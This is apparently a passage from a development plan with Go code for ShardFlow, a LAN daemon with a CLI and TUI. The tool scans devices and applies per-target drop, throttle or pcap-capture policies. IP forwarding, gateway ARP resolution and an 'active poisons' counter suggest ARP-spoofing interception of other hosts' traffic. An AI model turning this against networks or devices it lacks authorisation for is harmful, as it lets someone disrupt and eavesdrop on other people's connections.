			if mac, ok := store.ResolveIP(obs.IP); ok {
				obs.MAC = mac
			}
		}
		store.Upsert(obs)
	}

	scanner := func(ctx context.Context) error {
		actCtx, cancel := context.WithTimeout(ctx, 5*time.Second)
		defer cancel()
		if err := active.Sweep(actCtx, info.Name, info.HwAddr, info.IP, info.IPNet, 2*time.Second, store.Upsert); err != nil {
			return err
		}
		_ = mdns.Query(actCtx, info.Name, 3*time.Second, enrich)
		_ = ssdp.Query(actCtx, info.Name, 3*time.Second, enrich)
		return nil
	}

	// Forward declaration so the broadcaster closure can refer to srv
	// before it is constructed (Go closures capture by reference).
	var srv *rpc.Server
	handlers := rpc.BuildHandlers(rpc.HandlerDeps{
		Store:    store,
		Compiler: comp,
		Scanner:  scanner,
		GwMAC:    gwMAC,
		GwIP:     info.Gateway,
		Broadcaster: func(method string, params any) {
			if srv != nil {
				srv.Broadcast(method, params)
			}
		},
		ActivePoisons:  func() int { return len(arp.Active()) },
		DefaultPcapDir: *defaultPcapDir,
	})
	srv = rpc.NewServer(handlers)

	// Bridge devicestore subscription → server broadcast. Convert to the
	// DTO wire form so clients (TUI, CLI --json) get string-form IPs/MACs
	// rather than base64 byte arrays.
	go func() {
		ch := store.Subscribe()
		for ev := range ch {
			method := rpc.EventDeviceUpdated
			if ev.Kind == devicestore.EventDiscovered {
				method = rpc.EventDeviceDiscovered
			}
			dto := rpc.DeviceDTO{
				MAC:      ev.Device.MAC.String(),
				IP:       ev.Device.IP.String(),
				Hostname: ev.Device.Hostname,
				Vendor:   ev.Device.Vendor,
				LastSeen: ev.Device.LastSeen.Format(time.RFC3339),
			}
			srv.Broadcast(method, dto)
		}
	}()

	// Counter ticks.
	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-t.C:
				srv.Broadcast(rpc.EventCountersTick, map[string]any{"ts": time.Now().Unix()})
			}
		}
	}()

	// Signal handling: invoke shutdown (idempotent) and exit.
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sig
		fmt.Fprintln(os.Stderr, "shardflowd: shutting down")
		_ = srv.Stop()
		shutdown()
		cancel()
	}()

	if err := srv.Listen(ctx, *sockFlag); err != nil {
		return err
	}
	return nil
}

```

- [ ] **Step 2: Create `cmd/shardflowd/wire.go` with the small adapters and helpers**

```go
package main

import (
	"context"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"

	"github.com/hett-patell/ShardFlow/internal/iface"
	"github.com/hett-patell/ShardFlow/internal/tcmgr"
)

func preflight(sockPath, realIface string, force, clean bool) error {
	// Stale socket check.
	if _, err := os.Stat(sockPath); err == nil {
		if !force {
			return fmt.Errorf("socket %s already exists; another shardflowd running, or pass --force", sockPath)
		}
		_ = os.Remove(sockPath)
	}
	if err := os.MkdirAll(filepathDir(sockPath), 0o755); err != nil {
		return err
	}
	// Recovery check: scan every kernel object that shardflowd creates. If
	// any of them exist from a prior run, either clean (with --clean-on-start)
	// or refuse so the operator notices.
	type probe struct {
		name      string
		exists    func() bool
		teardown  func()
	}
	exists := func(args ...string) bool {
		out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
		return err == nil && len(out) > 0
	}
	run := func(args ...string) { _ = exec.Command(args[0], args[1:]...).Run() }

	probes := []probe{
		{"inet shardflow nft table",
			func() bool { return exists("nft", "list", "table", "inet", "shardflow") },
			func() { run("nft", "delete", "table", "inet", "shardflow") }},
		{"netdev shardflow_ingress nft table",
			func() bool { return exists("nft", "list", "table", "netdev", "shardflow_ingress") },
			func() { run("nft", "delete", "table", "netdev", "shardflow_ingress") }},
		{"shardflow0 IFB iface",
			func() bool { return exists("ip", "link", "show", "shardflow0") },
			func() { run("ip", "link", "del", "shardflow0") }},
		{"shardflow-cap dummy iface",
			func() bool { return exists("ip", "link", "show", "shardflow-cap") },
			func() { run("ip", "link", "del", "shardflow-cap") }},
		{realIface + " ingress qdisc",
			func() bool {
				out, err := exec.Command("tc", "qdisc", "show", "dev", realIface, "ingress").CombinedOutput()
				return err == nil && strings.Contains(string(out), "ingress")
			},
			func() { run("tc", "qdisc", "del", "dev", realIface, "ingress") }},
	}
	var orphans []string
	for _, p := range probes {
		if p.exists() {
			orphans = append(orphans, p.name)
		}
	}
	if len(orphans) == 0 {
		return nil
	}
	if !clean {
		return fmt.Errorf("orphaned ShardFlow state from a prior run: %s. Pass --clean-on-start to remove",
			strings.Join(orphans, "; "))
	}
	for _, p := range probes {
		if p.exists() {
			p.teardown()
		}
	}
	return nil
}

func filepathDir(p string) string {
	for i := len(p) - 1; i >= 0; i-- {
		if p[i] == '/' {
			return p[:i]
		}
	}
	return "."
}

func setIPv4Forward(v string) (string, error) {
	prev, err := os.ReadFile("/proc/sys/net/ipv4/ip_forward")
	if err != nil {
		return "", err
	}
	if err := os.WriteFile("/proc/sys/net/ipv4/ip_forward", []byte(v+"\n"), 0o644); err != nil {
		return "", err
	}
	return strings.TrimSpace(string(prev)), nil
}

// resolveGatewayMAC sends a directed ARP request for info.Gateway and
// waits up to 2 s for a reply, returning the gateway's MAC.
func resolveGatewayMAC(info iface.Info) (net.HardwareAddr, error) {
	handle, err := pcap.OpenLive(info.Name, 65536, false, pcap.BlockForever)
	if err != nil {
		return nil, err
	}
	defer handle.Close()
	if err := handle.SetBPFFilter("arp"); err != nil {
		return nil, err
	}

	eth := layers.Ethernet{
		SrcMAC:       info.HwAddr,
		DstMAC:       net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   info.HwAddr,
		SourceProtAddress: info.IP.To4(),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    info.Gateway.To4(),
	}
	buf := gopacket.NewSerializeBuffer()
	if err := gopacket.SerializeLayers(buf, gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}, &eth, &arp); err != nil {
		return nil, err
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		return nil, err
	}

	deadline := time.Now().Add(2 * time.Second)
	src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
	for time.Now().Before(deadline) {
		select {
		case pkt, ok := <-src.Packets():
			if !ok {
				return nil, errors.New("packet source closed")
			}
			al := pkt.Layer(layers.LayerTypeARP)
			if al == nil {
				continue
			}
			a := al.(*layers.ARP)
			if a.Operation != layers.ARPReply {
				continue
			}
			if !net.IP(a.SourceProtAddress).Equal(info.Gateway.To4()) {
				continue
			}
			return net.HardwareAddr(append([]byte{}, a.SourceHwAddress...)), nil
		case <-time.After(100 * time.Millisecond):
		}
	}
	return nil, errors.New("timeout waiting for gateway ARP reply")
}

```

(`*tcmgr.Manager` satisfies `policycompiler.TC` directly — no adapter needed.)

- [ ] **Step 3: Build and verify it compiles**

```bash
go build ./cmd/shardflowd/...
```

Expected: builds cleanly.

- [ ] **Step 4: Quick sanity smoke (must run as root with valid iface — may be deferred to Phase 7)**

```bash
sudo ./bin/shardflowd -i lo --force
```

Expected: starts, listens on `/run/shardflow/sock`, exits cleanly on Ctrl+C. (Will refuse if no IPv4 default route exists on `lo`, which is normal — see Phase 7 for proper integration testing.)

- [ ] **Step 5: Commit**

```bash
git add cmd/shardflowd/
git commit -m "feat(shardflowd): daemon main with lifecycle, signals, scanners, RPC"
```

---

## Phase 6: Client — RPC client, CLI, TUI

### Task 6.1: `internal/rpc` client

**Files:**
- Create: `internal/rpc/client.go`
- Create: `internal/rpc/client_test.go`

Symmetric to the server: opens the Unix socket, sends newline-delimited JSON-RPC requests, demuxes responses (matched by `id`) from server-pushed events (no `id`).

- [ ] **Step 1: Write failing test using a server stub**

In `internal/rpc/client_test.go`:

```go
package rpc

import (
	"bufio"
	"context"
	"encoding/json"
	"net"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestClientCallReceivesResult(t *testing.T) {
	dir := t.TempDir()
	sock := filepath.Join(dir, "s.sock")
	l, err := net.Listen("unix", sock)
	require.NoError(t, err)
	defer l.Close()

	go func() {
		conn, err := l.Accept()
		if err != nil {
			return
		}
		br := bufio.NewReader(conn)
		line, _ := br.ReadBytes('\n')
		var req Request
		_ = json.Unmarshal(line, &req)
		resp := Response{JSONRPC: "2.0", ID: req.ID, Result: json.RawMessage(`"pong"`)}
		b, _ := json.Marshal(resp)
		_, _ = conn.Write(append(b, '\n'))
	}()

	c, err := Dial(sock)
	require.NoError(t, err)
	defer c.Close()
	var res string
	require.NoError(t, c.Call(context.Background(), "ping", nil, &res))
	assert.Equal(t, "pong", res)
}
```

- [ ] **Step 2: Run, confirm fail**

```bash
go test ./internal/rpc/...
```

Expected: FAIL — `Dial`, `Call`, `Close` undefined.

- [ ] **Step 3: Implement client**

In `internal/rpc/client.go`:

```go
package rpc

import (
	"bufio"
	"context"
	"encoding/json"
	"errors"
	"net"
	"sync"
)

// Client is a JSON-RPC 2.0 client that demuxes responses from server-pushed events.
type Client struct {
	conn    net.Conn
	br      *bufio.Reader
	writeMu sync.Mutex // serialises writes across concurrent Calls

	mu      sync.Mutex
	nextID  int
	pending map[int]chan *Response
	events  chan Event
	closed  bool
}

// Dial connects to a daemon at sockPath.
func Dial(sockPath string) (*Client, error) {
	conn, err := net.Dial("unix", sockPath)
	if err != nil {
		return nil, err
	}
	c := &Client{
		conn:    conn,
		br:      bufio.NewReader(conn),
		pending: map[int]chan *Response{},
		events:  make(chan Event, 64),
	}
	go c.readLoop()
	return c, nil
}

// Events returns a channel of server-pushed events. Closed when Close is called.
func (c *Client) Events() <-chan Event { return c.events }

// Close terminates the connection.
func (c *Client) Close() error {
	c.mu.Lock()
	if c.closed {
		c.mu.Unlock()
		return nil
	}
	c.closed = true
	c.mu.Unlock()
	return c.conn.Close()
}

// Call invokes method with params (any JSON-encodable value or nil) and
// decodes the response into out (pointer or nil).
func (c *Client) Call(ctx context.Context, method string, params any, out any) error {
	c.mu.Lock()
	c.nextID++
	id := c.nextID
	ch := make(chan *Response, 1)
	c.pending[id] = ch
	c.mu.Unlock()

	cleanup := func() {
		c.mu.Lock()
		delete(c.pending, id)
		c.mu.Unlock()
	}

	idBytes, _ := json.Marshal(id)
	var pb json.RawMessage
	if params != nil {
		pj, err := json.Marshal(params)
		if err != nil {
			cleanup()
			return err
		}
		pb = pj
	}
	req := Request{JSONRPC: "2.0", ID: idBytes, Method: method, Params: pb}
	line, _ := json.Marshal(req)
	c.writeMu.Lock()
	_, werr := c.conn.Write(append(line, '\n'))
	c.writeMu.Unlock()
	if werr != nil {
		cleanup()
		return werr
	}

	select {
	case resp, ok := <-ch:
		if !ok || resp == nil {
			// readLoop closed the channel — connection dropped.
			return errors.New("rpc: connection closed before response")
		}
		if resp.Error != nil {
			return resp.Error
		}
		if out != nil && len(resp.Result) > 0 {
			return json.Unmarshal(resp.Result, out)
		}
		return nil
	case <-ctx.Done():
		cleanup()
		return ctx.Err()
	}
}

func (c *Client) readLoop() {
	defer close(c.events)
	for {
		line, err := c.br.ReadBytes('\n')
		if err != nil {
			c.mu.Lock()
			for _, ch := range c.pending {
				close(ch)
			}
			c.pending = nil
			c.mu.Unlock()
			return
		}
		// Frame is either Response (has "id") or Event (no "id" field, has "method").
		var probe struct {
			ID     json.RawMessage `json:"id"`
			Method string          `json:"method"`
		}
		if err := json.Unmarshal(line, &probe); err != nil {
			continue
		}
		if len(probe.ID) > 0 && probe.Method == "" {
			var resp Response
			if err := json.Unmarshal(line, &resp); err != nil {
				continue
			}
			var idNum int
			_ = json.Unmarshal(resp.ID, &idNum)
			c.mu.Lock()
			ch, ok := c.pending[idNum]
			delete(c.pending, idNum)
			c.mu.Unlock()
			if ok {
				ch <- &resp
			}
			continue
		}
		if probe.Method != "" {
			var ev Event
			if err := json.Unmarshal(line, &ev); err == nil {
				select {
				case c.events <- ev:
				default:
				}
			}
		}
	}
}
```

- [ ] **Step 4: Run, confirm pass**

```bash
go test ./internal/rpc/...
```

Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add internal/rpc/
git commit -m "feat(rpc): client with response/event demux"
```

---

### Task 6.2: `internal/cli` — Cobra commands

**Files:**
- Create: `internal/cli/root.go`
- Create: `internal/cli/scan.go`
- Create: `internal/cli/devices.go`
- Create: `internal/cli/policy.go`
- Create: `internal/cli/stats.go`
- Create: `internal/cli/cli_test.go`

Cobra root + subcommands. Each subcommand is one or more JSON-RPC calls to the daemon. Uses a small `output` helper for table-vs-JSON formatting.

- [ ] **Step 1: Add Cobra dependency**

```bash
go get github.com/spf13/cobra@latest
```

- [ ] **Step 2: Write failing test for the root command construction**

In `internal/cli/cli_test.go`:

```go
package cli

import (
	"testing"

	"github.com/stretchr/testify/assert"
)

func TestRootCommandHasExpectedSubcommands(t *testing.T) {
	root := NewRoot()
	names := map[string]bool{}
	for _, c := range root.Commands() {
		names[c.Name()] = true
	}
	for _, want := range []string{"scan", "devices", "policy", "stats", "tui"} {
		assert.True(t, names[want], "missing subcommand: "+want)
	}
}
```

- [ ] **Step 3: Run, confirm fail**

```bash
go test ./internal/cli/...
```

Expected: FAIL — `NewRoot` undefined.

- [ ] **Step 4: Implement root + subcommands**

In `internal/cli/root.go`:

```go
// Package cli provides the Cobra command tree for the shardflow client.
package cli

import (
	"github.com/spf13/cobra"
)

// SocketPath is the default daemon socket; --sock overrides.
const DefaultSocket = "/run/shardflow/sock"

// NewRoot returns the configured root command.
func NewRoot() *cobra.Command {
	root := &cobra.Command{
		Use:   "shardflow",
		Short: "ShardFlow client (CLI + TUI)",
	}
	root.PersistentFlags().String("sock", DefaultSocket, "daemon Unix socket path")
	root.PersistentFlags().Bool("json", false, "emit JSON instead of human tables")

	root.AddCommand(scanCmd())
	root.AddCommand(devicesCmd())
	root.AddCommand(policyCmd())
	root.AddCommand(statsCmd())
	root.AddCommand(tuiCmd())
	return root
}
```

In `internal/cli/scan.go`:

```go
package cli

import (
	"context"
	"fmt"

	"github.com/spf13/cobra"

	"github.com/hett-patell/ShardFlow/internal/rpc"
)

func scanCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "scan",
		Short: "Trigger a one-shot LAN scan (active ARP + mDNS + SSDP).",
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			c, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer c.Close()
			var res map[string]string
			if err := c.Call(context.Background(), rpc.MethodScan, nil, &res); err != nil {
				return err
			}
			fmt.Println("scan:", res["status"])
			return nil
		},
	}
}
```

In `internal/cli/devices.go`:

```go
package cli

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"text/tabwriter"

	"github.com/spf13/cobra"

	"github.com/hett-patell/ShardFlow/internal/rpc"
)

func devicesCmd() *cobra.Command {
	c := &cobra.Command{
		Use:   "devices",
		Short: "List or inspect devices known to the daemon.",
	}
	c.AddCommand(devicesListCmd())
	c.AddCommand(devicesGetCmd())
	return c
}

func devicesListCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "list",
		Short: "Print the current device list.",
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			emitJSON, _ := cmd.Flags().GetBool("json")
			cli, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer cli.Close()
			var out []rpc.DeviceDTO
			if err := cli.Call(context.Background(), rpc.MethodDevicesList, nil, &out); err != nil {
				return err
			}
			if emitJSON {
				return json.NewEncoder(os.Stdout).Encode(out)
			}
			tw := tabwriter.NewWriter(os.Stdout, 0, 0, 2, ' ', 0)
			fmt.Fprintln(tw, "IP\tMAC\tHOSTNAME\tVENDOR\tLAST_SEEN")
			for _, d := range out {
				fmt.Fprintf(tw, "%s\t%s\t%s\t%s\t%s\n",
					d.IP, d.MAC, d.Hostname, d.Vendor, d.LastSeen)
			}
			return tw.Flush()
		},
	}
}

func devicesGetCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "get <mac>",
		Short: "Show detail for a device by MAC.",
		Args:  cobra.ExactArgs(1),
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			cli, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer cli.Close()
			var d rpc.DeviceDTO
			err = cli.Call(context.Background(), rpc.MethodDevicesGet, map[string]string{"mac": args[0]}, &d)
			if err != nil {
				return err
			}
			return json.NewEncoder(os.Stdout).Encode(d)
		},
	}
}
```

In `internal/cli/policy.go`:

```go
package cli

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/spf13/cobra"

	"github.com/hett-patell/ShardFlow/internal/rpc"
)

func policyCmd() *cobra.Command {
	c := &cobra.Command{Use: "policy", Short: "Set, clear, or list per-target policies."}
	c.AddCommand(policySetCmd(), policyClearCmd(), policyListCmd())
	return c
}

func policySetCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "set <target> <kind> [rate|dir]",
		Short: "Apply a policy. Kind ∈ {drop, throttle, pcap}. throttle takes a rate (200kbit); pcap takes a dir.",
		Args:  cobra.MinimumNArgs(2),
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			cli, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer cli.Close()
			p := rpc.PolicySpec{Target: args[0], Kind: rpc.PolicyKind(args[1])}
			switch p.Kind {
			case rpc.PolicyThrottle:
				if len(args) < 3 {
					return fmt.Errorf("throttle requires a rate, e.g. 200kbit")
				}
				p.RateKbit, err = parseRate(args[2])
				if err != nil {
					return err
				}
			case rpc.PolicyPcap:
				if len(args) < 3 {
					return fmt.Errorf("pcap requires a directory")
				}
				p.PcapDir = args[2]
			case rpc.PolicyDrop:
				// no extra args
			default:
				return fmt.Errorf("unknown kind %q (drop|throttle|pcap)", args[1])
			}
			var res map[string]string
			if err := cli.Call(context.Background(), rpc.MethodPolicySet, p, &res); err != nil {
				return err
			}
			fmt.Println("policy:", res["status"])
			return nil
		},
	}
}

func policyClearCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "clear <target>",
		Args:  cobra.ExactArgs(1),
		Short: "Clear policy for target (IP or MAC).",
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			cli, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer cli.Close()
			var res map[string]string
			err = cli.Call(context.Background(), rpc.MethodPolicyClear, map[string]string{"target": args[0]}, &res)
			if err != nil {
				return err
			}
			fmt.Println("policy:", res["status"])
			return nil
		},
	}
}

func policyListCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "list",
		Short: "List active policies.",
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			cli, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer cli.Close()
			var entries []rpc.PolicyEntryDTO
			if err := cli.Call(context.Background(), rpc.MethodPolicyList, nil, &entries); err != nil {
				return err
			}
			fmt.Printf("%d active polic(ies)\n", len(entries))
			for _, e := range entries {
				switch e.Kind {
				case "throttle":
					fmt.Printf("  %s → throttle %dkbit\n", e.MAC, e.RateKbit)
				case "pcap":
					fmt.Printf("  %s → pcap %s\n", e.MAC, e.PcapDir)
				default:
					fmt.Printf("  %s → %s\n", e.MAC, e.Kind)
				}
			}
			return nil
		},
	}
}

// parseRate accepts "200kbit", "1mbit", "500kbps" → kbit
func parseRate(s string) (int, error) {
	s = strings.ToLower(strings.TrimSpace(s))
	mul := 1
	num := s
	switch {
	case strings.HasSuffix(s, "kbit"), strings.HasSuffix(s, "kbps"):
		num = s[:len(s)-4]
	case strings.HasSuffix(s, "mbit"), strings.HasSuffix(s, "mbps"):
		num = s[:len(s)-4]
		mul = 1024
	}
	n, err := strconv.Atoi(num)
	if err != nil {
		return 0, fmt.Errorf("bad rate %q", s)
	}
	return n * mul, nil
}
```

In `internal/cli/stats.go`:

```go
package cli

import (
	"context"
	"encoding/json"
	"os"

	"github.com/spf13/cobra"

	"github.com/hett-patell/ShardFlow/internal/rpc"
)

func statsCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "stats",
		Short: "Print daemon stats once (use TUI for live).",
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			cli, err := rpc.Dial(sock)
			if err != nil {
				return err
			}
			defer cli.Close()
			var raw map[string]any
			if err := cli.Call(context.Background(), rpc.MethodStats, nil, &raw); err != nil {
				return err
			}
			return json.NewEncoder(os.Stdout).Encode(raw)
		},
	}
}

// tuiCmd is wired in cli_tui.go (defined in Task 6.3).
```

Add a stub for `tuiCmd` so `NewRoot` compiles before Task 6.3:

In `internal/cli/tui_stub.go`:

```go
//go:build !tui

package cli

import "github.com/spf13/cobra"

func tuiCmd() *cobra.Command {
	return &cobra.Command{
		Use:    "tui",
		Short:  "Launch the TUI dashboard (built when -tags=tui).",
		Hidden: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			return errStubTUI
		},
	}
}
```

Wait — that's awkward. Simpler: just make `tuiCmd()` return a stub command whose `RunE` calls into `tui.Run` once Task 6.3 lands. We can drop the build tag entirely. Replace with this single file:

In `internal/cli/tui_cmd.go`:

```go
package cli

import (
	"github.com/spf13/cobra"

	"github.com/hett-patell/ShardFlow/internal/tui"
)

func tuiCmd() *cobra.Command {
	c := &cobra.Command{
		Use:   "tui",
		Short: "Launch the live TUI dashboard.",
		RunE: func(cmd *cobra.Command, args []string) error {
			sock, _ := cmd.Flags().GetString("sock")
			rate, _ := cmd.Flags().GetInt("default-throttle-kbit")
			pcapDir, _ := cmd.Flags().GetString("default-pcap-dir")
			return tui.Run(sock, rate, pcapDir)
		},
	}
	c.Flags().Int("default-throttle-kbit", 200, "rate applied by the [t] shortcut in the TUI")
	c.Flags().String("default-pcap-dir", "/var/lib/shardflow/pcap", "directory used by the [p] shortcut in the TUI")
	return c
}
```

(This forces Task 6.3 to ship `tui.Run` before the CLI package builds end-to-end. To keep this task self-contained and testable, the test in Step 2 only checks that the command tree contains a `tui` entry — it doesn't run it. Adding a temporary `internal/tui/stub.go` with `func Run(string) error { return nil }` is acceptable here so this task lands clean, and Task 6.3 replaces the stub.)

- [ ] **Step 5: Add the temporary `tui.Run` stub for compile**

In `internal/tui/stub.go`:

```go
package tui

// Run is replaced in Task 6.3.
func Run(_ string, _ int, _ string) error { return nil }
```

- [ ] **Step 6: Run, confirm pass**

```bash
go test ./internal/cli/...
```

Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add internal/cli/ internal/tui/stub.go go.mod go.sum
git commit -m "feat(cli): Cobra command tree for shardflow client"
```

---

### Task 6.3: `internal/tui` — bubbletea dashboard

**Files:**
- Modify: `internal/tui/stub.go` → delete
- Create: `internal/tui/tui.go`
- Create: `internal/tui/model.go`
- Create: `internal/tui/keys.go`
- Create: `internal/tui/model_test.go`

Operationally complete dashboard. Subscribes to events from the daemon; sends Policy.Set/Clear via the same client. Layout from spec §7.5 (devices left, policy editor right, log + counters bottom).

- [ ] **Step 1: Delete the stub**

```bash
rm internal/tui/stub.go
```

- [ ] **Step 2: Add bubbletea + lipgloss dependencies**

```bash
go get github.com/charmbracelet/bubbletea@latest
go get github.com/charmbracelet/lipgloss@latest
```

- [ ] **Step 3: Write failing test for model state transitions**

In `internal/tui/model_test.go`:

```go
package tui

import (
	"testing"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/stretchr/testify/assert"
)

func TestModelHandlesQuit(t *testing.T) {
	m := newModel(nil, 200, "/var/lib/shardflow/pcap")
	_, cmd := m.Update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'q'}})
	// Expect a tea.Quit command.
	assert.NotNil(t, cmd)
}

func TestModelMovesSelectionDownUp(t *testing.T) {
	m := newModel(nil, 200, "/var/lib/shardflow/pcap")
	m.devices = []deviceRow{{ip: "10.0.0.42"}, {ip: "10.0.0.55"}}
	m, _ = m.update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'j'}})
	assert.Equal(t, 1, m.cursor)
	m, _ = m.update(tea.KeyMsg{Type: tea.KeyRunes, Runes: []rune{'k'}})
	assert.Equal(t, 0, m.cursor)
}
```

- [ ] **Step 4: Implement the model and entry point**

In `internal/tui/keys.go`:

```go
package tui

import tea "github.com/charmbracelet/bubbletea"

// keyMatch returns true when msg is a runes key matching any rune in s.
func keyMatch(msg tea.Msg, s string) (rune, bool) {
	km, ok := msg.(tea.KeyMsg)
	if !ok {
		return 0, false
	}
	if km.Type != tea.KeyRunes || len(km.Runes) != 1 {
		return 0, false
	}
	r := km.Runes[0]
	for _, want := range s {
		if r == want {
			return r, true
		}
	}
	return 0, false
}
```

In `internal/tui/model.go`:

```go
package tui

import (
	"fmt"
	"strings"
	"time"

	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"

	"github.com/hett-patell/ShardFlow/internal/rpc"
)

type deviceRow struct {
	ip       string
	mac      string
	hostname string
	vendor   string
	policy   string // current policy summary, e.g. "throttle 200kbit", "pcap", "drop", or "" if none
}

type model struct {
	client          *rpc.Client
	devices         []deviceRow
	cursor          int
	logLines        []string
	lastTick        time.Time
	width           int
	height          int
	defaultRateKbit int
	defaultPcapDir  string
}

func newModel(c *rpc.Client, defaultRateKbit int, defaultPcapDir string) model {
	return model{
		client: c, lastTick: time.Now(),
		defaultRateKbit: defaultRateKbit,
		defaultPcapDir:  defaultPcapDir,
	}
}

// Adapter so the test can call update without using the bubbletea-internal
// Cmd interface.
func (m model) update(msg tea.Msg) (model, tea.Cmd) {
	nm, cmd := m.Update(msg)
	return nm.(model), cmd
}

// Init issues the initial Devices.List + Policy.List and subscribes to the
// daemon event stream — both as tea.Cmds so bubbletea owns the goroutines.
// Calling p.Send from outside (e.g. from a hand-rolled goroutine) before
// p.Run begins is racy; routing everything through Cmds avoids that.
func (m model) Init() tea.Cmd {
	return tea.Batch(refreshDevicesCmd(m.client), waitForEventCmd(m.client))
}

func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width, m.height = msg.Width, msg.Height
		return m, nil
	case tea.KeyMsg:
		if r, ok := keyMatch(msg, "qQ"); ok && (r == 'q' || r == 'Q') {
			return m, tea.Quit
		}
		if _, ok := keyMatch(msg, "j"); ok {
			if m.cursor < len(m.devices)-1 {
				m.cursor++
			}
			return m, nil
		}
		if _, ok := keyMatch(msg, "k"); ok {
			if m.cursor > 0 {
				m.cursor--
			}
			return m, nil
		}
		// d/t/p/x : apply policy to selected
		if r, ok := keyMatch(msg, "dtpx"); ok && len(m.devices) > 0 {
			return m, applyPolicyCmd(m.client, m.devices[m.cursor].ip, r, m.defaultRateKbit, m.defaultPcapDir)
		}
		if _, ok := keyMatch(msg, "s"); ok {
			return m, tea.Batch(scanCmd(m.client), refreshDevicesCmd(m.client))
		}
	case devicesLoadedMsg:
		m.devices = msg.rows
		if m.cursor >= len(m.devices) {
			m.cursor = 0
		}
	case eventMsg:
		m.logLines = append(m.logLines, msg.text)
		if len(m.logLines) > 200 {
			m.logLines = m.logLines[len(m.logLines)-200:]
		}
		// Re-subscribe for the next event only while connected. If this
		// message also requests a device-list refresh, batch both Cmds.
		next := waitForEventCmd(m.client)
		if msg.refreshDevices {
			return m, tea.Batch(next, refreshDevicesCmd(m.client))
		}
		return m, next
	case disconnectedMsg:
		m.logLines = append(m.logLines, "(daemon disconnected)")
		// Do NOT re-issue waitForEventCmd; the channel is closed and the
		// Cmd would return another disconnectedMsg immediately, spinning
		// the program loop at full CPU.
		return m, nil
	}
	return m, nil
}

func (m model) View() string {
	headerStyle := lipgloss.NewStyle().Bold(true)
	left := strings.Builder{}
	left.WriteString(headerStyle.Render(fmt.Sprintf("Devices (%d)", len(m.devices))))
	left.WriteString("\n")
	for i, d := range m.devices {
		marker := "  "
		if i == m.cursor {
			marker = "▶ "
		}
		policy := d.policy
		if policy == "" {
			policy = "—"
		}
		left.WriteString(fmt.Sprintf("%s%-15s %-12s %-20s [%s]\n", marker, d.ip, d.mac, d.hostname, policy))
	}
	left.WriteString("\n[j/k] move  [s] scan  [q] quit\n")

	right := strings.Builder{}
	right.WriteString(headerStyle.Render("Policy"))
	right.WriteString("\n")
	if len(m.devices) > 0 {
		right.WriteString("Target: " + m.devices[m.cursor].ip + "\n\n")
	}
	right.WriteString("[d] drop  [t] throttle  [p] pcap  [x] clear\n")

	bottom := "Log:\n" + strings.Join(tail(m.logLines, 10), "\n")
	return lipgloss.JoinVertical(lipgloss.Left,
		lipgloss.JoinHorizontal(lipgloss.Top, left.String(), "  ", right.String()),
		bottom,
	)
}

func tail(s []string, n int) []string {
	if len(s) <= n {
		return s
	}
	return s[len(s)-n:]
}

type eventMsg struct {
	text           string
	refreshDevices bool
}

type devicesLoadedMsg struct{ rows []deviceRow }

// disconnectedMsg signals that the daemon's event channel closed. Update
// records this once and stops re-issuing waitForEventCmd; without this
// distinction the Cmd would re-fire on a closed channel forever.
type disconnectedMsg struct{}
```

In `internal/tui/tui.go`:

```go
// Package tui implements the bubbletea dashboard for the shardflow client.
package tui

import (
	"context"
	"fmt"

	tea "github.com/charmbracelet/bubbletea"

	"github.com/hett-patell/ShardFlow/internal/rpc"
)

// Run blocks running the TUI connected to the daemon at sockPath. The
// defaults govern policy values applied via single-key shortcuts; for
// values outside these defaults the operator uses the CLI's `policy set`
